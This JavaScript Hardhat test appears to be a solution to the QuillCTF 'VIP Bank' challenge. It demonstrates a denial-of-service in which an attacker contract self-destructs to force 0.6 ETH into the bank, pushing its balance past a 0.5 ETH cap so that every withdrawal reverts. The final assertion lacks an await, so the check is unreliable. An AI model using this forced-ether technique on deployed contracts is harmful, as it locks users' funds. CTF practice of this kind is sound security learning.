const {expect} = require ("chai");
const {ethers} = require ("hardhat");

describe ("QuillCTF 3: VIP BANK" , ()=> {
  let vipbankcontract; // VIP BANK contract 
  let attackvipbankcontract; // contract that attack vip bank contract

  let vipbankcontractdeployer ;
  beforeEach(async()=>{
    // get contract deployer 
    [vipbankcontractdeployer] = await ethers.getSigners();

    // deploy the VIP_Bank contract
    const VIPBANKCONTRACT = await ethers.getContractFactory("VIP_Bank"); 
    vipbankcontract = await VIPBANKCONTRACT.deploy();

    // deploy the attack vip bank contract 
    const ATTACKERVIPBANKCONTRACT = await ethers.getContractFactory("ATTACK_VIP_BANK");
    attackvipbankcontract = await ATTACKERVIPBANKCONTRACT.deploy({value: ethers.parseEther("0.6")});
    // Now the funds in the ATTACK_VIP_BANK is 0.6 ethers

  })
  it ("should revert with this statement: Cannot withdraw more than 0.5 ETH per transaction",async()=>{

    // Manager add himself as a VIP for testing the POC
    // Because withdraw function test firstly on if this person is a VIP person or not from the modifier onlyVIP
    await vipbankcontract.addVIP(vipbankcontractdeployer.address);
    // destroy the ATTACK_VIP_BANK contract and it will send the 0.6 ethers into VIP_Bank contract
    // call destroy_vip_bank_contract and pass it the VIP_Bank contract address
    await attackvipbankcontract.destroy_vip_bank_contract(vipbankcontract.target);
    // Now let's try to withdraw any funds from VIP_Bank
    // Try to withdraw 0.05 ethers it should revert and send can withdraw because now the address(this).balance "0.6 ethers" become 
    // larget than the maxETH which is 0.5 ethers 
    expect(vipbankcontract.withdraw(ethers.parseEther("0.05"))).to.be.revertedWith("Cannot withdraw more than 0.5 ETH per transaction");
    // challenge done 

  })




})
